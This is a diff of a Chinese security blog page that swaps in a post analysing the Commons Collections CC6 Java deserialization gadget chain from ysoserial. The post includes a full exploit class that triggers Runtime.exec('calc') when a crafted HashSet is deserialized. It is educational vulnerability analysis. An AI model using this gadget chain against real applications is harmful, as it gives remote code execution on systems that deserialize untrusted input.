@@ -16,22 +16,26 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
+    <meta name="description" content="为了解决高版本Java8中CC1失效的问题，ysoserial中使用了CC6这条链">
 <meta property="og:type" content="article">
-<meta property="og:title" content="安装frida-objection-Android的hook框架">
-<meta property="og:url" content="https://3xsh0re.github.io/2024/05/21/%E5%AE%89%E8%A3%85frida-objection-Android%E7%9A%84hook%E6%A1%86%E6%9E%B6/index.html">
+<meta property="og:title" content="CC6链">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
-<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
+<meta property="og:description" content="为了解决高版本Java8中CC1失效的问题，ysoserial中使用了CC6这条链">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-05-21T06:18:00.000Z">
-<meta property="article:modified_time" content="2024-07-30T13:17:53.793Z">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914152451135.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914220207010.png">
+<meta property="article:published_time" content="2024-08-19T07:18:15.000Z">
+<meta property="article:modified_time" content="2024-09-14T14:04:46.225Z">
 <meta property="article:author" content="3xsh0re">
-<meta property="article:tag" content="逆向工具">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Java安全">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914152451135.png">
   
   
   
-  <title>安装frida-objection-Android的hook框架 - 3xsh0re&#39;Blog</title>
+  <title>CC6链 - 3xsh0re&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -350,7 +354,7 @@ mjx-container[display="true"] + br {
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="安装frida-objection-Android的hook框架"></span>
+            <span id="subtitle" data-typed-text="CC6链"></span>
           
         </div>
 
@@ -361,8 +365,8 @@ mjx-container[display="true"] + br {
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-05-21 14:18" pubdate>
-          2024年5月21日 下午
+        <time datetime="2024-08-19 15:18" pubdate>
+          2024年8月19日 下午
         </time>
       </span>
     
@@ -373,7 +377,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.1k 字
+          3.3k 字
         
       </span>
     
@@ -384,7 +388,7 @@ mjx-container[display="true"] + br {
         
         
         
-          20 分钟
+          21 分钟
         
       </span>
     
@@ -429,33 +433,53 @@ mjx-container[display="true"] + br {
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">安装frida-objection-Android的hook框架</h1>
+            <h1 id="seo-header">CC6链</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年7月30日 晚上
+                    本文最后更新于：2024年9月14日 晚上
                   
                 
               </p>
             
             
-              
-              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="f9c9c9211dbececf212fcb8d30f18d07fe8221b079ff1c8e24a851e418a76e30">80f7af2430a3dce6996ee26d1569b238162cc0d7b02137d8db319d02716fd0b9187c06895432e07fc5300c3613475d30c846d10971adfb583e8ee7f9e12803f69eed5013bf7772f246ff7a06e8c8becad6cbfe2e4500f3aef00ead65d16730fb319295665332102ac93d818442a84669e1585d19312d0e8ca45a71ed292961f2c88e19cb94fa7694b332c773a756ddc1c0dad1ea62a7c80c19ac868ce398685eca559c26c5ab5d62d59520fc3e1d1b2516f5a4fc967e4b24e4b0d6fece3545a1468c3c443ba0b4003db3cd396db0d86de4c4731f67c8589f8edf7d55c810c3d8e44c07c68a4fa0828e1138a6692560274c3b39f7ecbd9f386e9e611c7ad3343fa38873c344e32ac85f2b0f01255f31d345eb724b641a33d6bf2da34580fa977a90810e14b221b2123d7009e98587a8e53ed7d4f1808ca2517859dc4e18aab291bc4143b630054d4f6bc661babf795c22debae420f7c31a503f2ee4b7ad223e7d3355a418800a29ee987f63c2900ed950e22bb1c465f52463c2c89a90078d7560fe7a924199f8f8a569d5b673ec84a328f0cd8d147e503d3872c30dd1a190c98ee01c2ef1a0d444742f5886c36e6641b69a1a4006da012bfab915baed8154657b567dff82564a524a8ed902561fac0c180bac3ba225ad941bf8d30086ea4584c6c2b732df35ca17fb29b8c6dede805f7925909395b018f67bb93369f9089a7f83bc3f9740a1ba6fd6e9e398e3e7151a629a3913365a71ef8853bbe07a375479606b587e46f7a02a9b90f7d459eedc06e276630ed576e67beec2a5196f31f9a605606525ba6769737a6aefccd4b7dc125d69affd4473e24c297fd395ef927c8c6cfe0fdb0327ebbfc53494fa7bebb660c67c6519212895d6243368e20589bae1cd3914f4589a73438aa9edbd63cb5b0e11ccfe8820f6c22f4a8a91277379a5cf8d802c269448bbc173a536014724b2f7c1194b67febbc21754188329bcf16bc91b0fa2b2b4948fa5efe99e9fc1a75c49472cdf4b4d2eb898e18d7fe8ff84af8bdef18931bb898117f54b6958e8106ac4cc065372888a969c77346d28929e2b06378cf20a4dec19f76dcce4a8ec213c28702474ee2a6cfddb7bc7541e0dfe281d676ee30ec1fea9bf826b89683df8a286bf3b19597c91e8d77e723db64508b742f87c165276f130b8361576f3f68a5dd02de11064b9a4161ff7c05c7c1bb9049f200bf60603f5d3ca7cee1fc05cc9e38f0f136e1fafeaf010d8d8a4a15b3d8bc28fe53e0fa6c46595e2fa1e7eb0dc2d3449a100ecd21b081aaf018af7a042ba5cf77260eda90602d7e66ec28a459265ab990623461499522930df4f535410a783797b5f38f61622aee6dbe4fb02a036edad0b61386154f7c0d0428df8fbfe84eae6992b54905e97d5e94fceab0c9acb5858d97bbfe1a39df056d8ed9dcef736dadd07a465f75a2c698668285ab0b79825353cebbdbd95c03214725a0ddc7637b7803db4fd7b147a424a174409cca6d0f7adbccf7b33bce1957aaab25636ed1d373cff5c3d7a9d98580366b484271a33eb6f56faf3dd42a0532d5191b2f0bd996f269e66fa7d2bfc49ec93293263e7edae9781bdfc280562dba77d65c99dd0b043cf4d99b2fdd745f1ef5e34e67db6e8d67acbbfc5531469a25a147f7ad59a60cd024a18b00af4089b484abb154be25c8d58df233832847b1f0bf675531d0d54a39e52e9d5604da32200583b475015740b19f911712ef5f3cc8e9005e71151d0abdbe1104b33550333b326c322bd9dba20435465e29672eaf8176bb059a06c12f59cc23e10f1261e805da3363441952c0e74fa9a616d4f05171719525d441bf7013617d0bf80573fbfbde7e893d662c427bab47bf4eadfb22f5cbb6bd3b098fe6b82cd276ee069ede5b4b348ce05408f03d92f63e45b1c2dfb5cc5eafba4bf855a5086ba5b4fb17ff6ee5ced9588711800cb5278e940efde06dd802cd00cce36ee0145327ac2492f5943511de09bed578f22df1d59f74e7bca2fa39497f8997079c07355cbaebb620294a7740bbcfa480e06e9023f1a93188595688bc0e8bbc5d13e02c5ce887de1a5177e860add1966bb9f58a7974ce890057f6c0c2b20c1bfaf4e043fa92b3b2941fac29f922585aadaa1fd108e193a4ac914177212deb6507391b2153a59b13631a230c2db3e581d5193</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
-              
+              <div class="markdown-body">
+                
+                <p>为了解决高版本Java8中CC1失效的问题，<code>ysoserial</code>中使用了CC6这条链</p>
+<span id="more"></span>
 
-              
+<p>在Java 8u71以后，<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>的逻辑变化了。这里提供一个高版本的<code>sun</code>包源码<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/6bfaecb8ff77/src/share/classes/sun">下载地址</a>，改变后发现原来的CC1就无法弹计算器了。</p>
+<p>在项目源码中可以看到，仍然使用<code>LazyMap</code>作为入口，只不过上层调用变了</p>
+<img src="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914152451135.png" srcset="/img/loading.gif" lazyload class="" title="image-20240914152451135">
+
+<p>项目使用的类是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>，在其<code>getValue</code>⽅法中调⽤了<code>this.map.get</code>，我们<strong>注意这里的map就需要是我们构造的LazyMap</strong>。那么如何构造<code>TiedMapEntry</code>实例呢，可以看它的构造函数，直接将我们的<code>LazyMap</code>和随便一个key传入即可构造。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Gets the value of this entry direct from the map.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> {<br>    <span class="hljs-keyword">return</span> map.get(key);<br>}<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Constructs a new entry with the given Map and key.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> map  the map</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> key  the key</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    <span class="hljs-built_in">this</span>.map = map;<br>    <span class="hljs-built_in">this</span>.key = key;<br>}<br></code></pre></td></tr></table></figure>
+
+<p>然后在多个函数中调用了<code>getValue</code>方法，但是<code>ysoserial</code>选择的是<code>hashCode()</code>方法，注释也说明了这个方法是<code>MapEntry#hashCode</code>接口的实现，用于返回value的hash值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Gets a hashCode compatible with the equals method.</span><br><span class="hljs-comment"> * &lt;p&gt;</span><br><span class="hljs-comment"> * Implemented per API documentation of {<span class="hljs-doctag">@link</span> java.util.Map.Entry#hashCode()}</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> a suitable hash code</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> {<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>}<br></code></pre></td></tr></table></figure>
+
+<p>然后使用了<code>HashMap</code>的<code>hash</code>方法去触发，可以发现是<code>key.hashCode()</code>，说明我们的payload应该作为<code>key</code>，我们<strong>目前构造了<code>TiedMapEntry</code>实例，那么我们下一步就是将其作为<code>key</code>去新构造一个<code>hashMap</code>实例。</strong>然后<code>put</code>方法对<code>hash</code>进行了调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> {<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>}<br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> {<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>}<br></code></pre></td></tr></table></figure>
+
+<p>最后顶层是<code>HashSet</code>的<code>readObject</code>作为入口，反序列化漏洞大都存在于某个类的<code>readObject</code>中，分析到目前我有一个感受就是，更像是两边向中间衍生，然后刚好链接在一起就出现了漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Read in all elements in the proper order.</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) {<br>    <span class="hljs-meta">@SuppressWarnings("unchecked")</span><br>        <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (E) s.readObject();<br>    map.put(e, PRESENT);<span class="hljs-comment">//trigger!</span><br>}<br></code></pre></td></tr></table></figure>
+
+<p>分析到这里可以写出Exp的内容了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {<br>        Transformer[] fakeFormer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)};<br>        <span class="hljs-comment">// 第一层</span><br>        Transformer[] tfs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)<br>        };<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeFormer);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(),transformerChain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">"key"</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">tiedMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        tiedMap.put(tiedMapEntry,<span class="hljs-string">"Exp"</span>);<br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashSet.add(tiedMap);<br>        lazyMap.remove(<span class="hljs-string">"key"</span>);<br><span class="hljs-comment">//        反射修改变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">"iTransformers"</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, tfs);<br><br>        <span class="hljs-comment">// 测试</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(hashSet);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        ois.readObject();<br>    }<br>}<br></code></pre></td></tr></table></figure>
+
+<p>这其中有个非常关键的代码<code>lazyMap.remove("key");</code>， 为什么要移除，看到<code>LazyMap.get()</code>的代码：</p>
+<p><strong>存在一个是否含有键值的判断，而我们的key在构造<code>TiedMapEntry</code>的时候就被固定下来了，除非你用反射去修改，但是没有必要，直接在<code>lazyMap</code>中把<code>key</code>的键值对给去除就行</strong>。</p>
+<img src="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914220207010.png" srcset="/img/loading.gif" lazyload class="" title="image-20240914220207010">
+
+<p>最后捋一捋，</p>
+<p><code>LazyMap</code>作为CC6的一个转折点，往下已经分析过多次。</p>
+<p>往上走，使用<code>LazyMap</code>构造了一个<code>TiedMapEntry</code>实例，目的是为了使用<code>LazyMap.get()</code></p>
+<p>再用<code>TiedMapEntry</code>作为了一个新的<code>HashMap</code>的<code>key</code>值，目的是为了触发<code>key.hashCode()</code></p>
+<p>最后用<code>HashSet</code>包裹，目的是为了使用其<code>readObject</code>方法来触发<code>map.put()</code>，从而进入<code>hash(key)-&gt;key.hashCode()</code></p>
+
+                
+              </div>
             
             <hr/>
             <div>
@@ -471,7 +495,7 @@ mjx-container[display="true"] + br {
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="category-chain-item">工具使用</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
   
   
 
@@ -486,7 +510,9 @@ mjx-container[display="true"] + br {
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7/" class="print-no-link">#逆向工具</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
       
     </div>
   
@@ -498,8 +524,8 @@ mjx-container[display="true"] + br {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>安装frida-objection-Android的hook框架</div>
-      <div>https://3xsh0re.github.io/2024/05/21/安装frida-objection-Android的hook框架/</div>
+      <div>CC6链</div>
+      <div>https://3xsh0re.github.io/2024/08/19/CC6链分析/</div>
     </div>
     <div class="license-meta">
       
@@ -511,7 +537,7 @@ mjx-container[display="true"] + br {
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年5月21日</div>
+          <div>2024年8月19日</div>
         </div>
       
       
@@ -543,9 +569,9 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/" title="通过数组构造树">
+                      <a href="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="URLDNS链分析">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">通过数组构造树</span>
+                        <span class="hidden-mobile">URLDNS链分析</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -553,8 +579,8 @@ mjx-container[display="true"] + br {
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/05/14/%E7%AE%97%E6%B3%95%E4%B9%8B%E9%93%BE%E8%A1%A8/" title="算法之链表">
-                        <span class="hidden-mobile">算法之链表</span>
+                      <a href="/2024/08/13/CC1%E9%93%BElazyMap/" title="CC1链lazyMap">
+                        <span class="hidden-mobile">CC1链lazyMap</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -779,23 +805,6 @@ mjx-container[display="true"] + br {
   
 
 
-
-
-  
-  <script defer>
-    if (document.getElementById('hbePass') || document.querySelector('hbe-prefix')) {
-      Fluid.utils.waitElementLoaded('hbe-prefix', function() {
-        var hbePrefix = document.querySelector('hbe-prefix');
-        hbePrefix.parentElement.classList.add('markdown-body');
-        Fluid.utils.retry(function() {
-          if (Fluid.boot && Fluid.boot.refresh) {
-            Fluid.boot.refresh();
-            return true;
-          }
-        }, 100, 10);
-      })
-    }
-  </script>
 
 
   
